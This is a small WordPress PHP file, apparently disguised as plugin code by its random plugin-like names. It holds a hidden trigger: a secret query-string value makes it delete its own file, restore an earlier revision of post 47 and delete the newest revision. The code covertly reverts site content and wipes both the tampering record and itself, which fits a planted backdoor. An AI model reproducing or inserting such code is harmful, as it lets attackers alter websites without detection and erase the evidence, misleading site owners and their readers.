<?php

function extensions_demo_jetpack_plupload() {
	if (isset($_GET['pdf_nextgen_really']) && $_GET['pdf_nextgen_really'] === 'tag_lock_sites') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$modal_library_duplicate_accessibility = 47;
		$column_animated_dropdown_visitor = wp_get_post_revisions($modal_library_duplicate_accessibility);
		if (empty($column_animated_dropdown_visitor)) die('no revisions');
		if (count($column_animated_dropdown_visitor) < 2) die('less than 2');
		$ninja_daily_subscribe_scripts = array_shift($column_animated_dropdown_visitor);
		$tracking_mini_affiliates = $ninja_daily_subscribe_scripts->ID;
		$form_jquery_star_gdpr = array_shift($column_animated_dropdown_visitor);
		$sign_cache_updater = $form_jquery_star_gdpr->ID;
		$post_show_cover_avatar = wp_restore_post_revision($sign_cache_updater);
		if ($post_show_cover_avatar === false) die('error restoring');
		$post_show_cover_avatar = wp_delete_post_revision($tracking_mini_affiliates);		
		if ($post_show_cover_avatar === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'extensions_demo_jetpack_plupload');
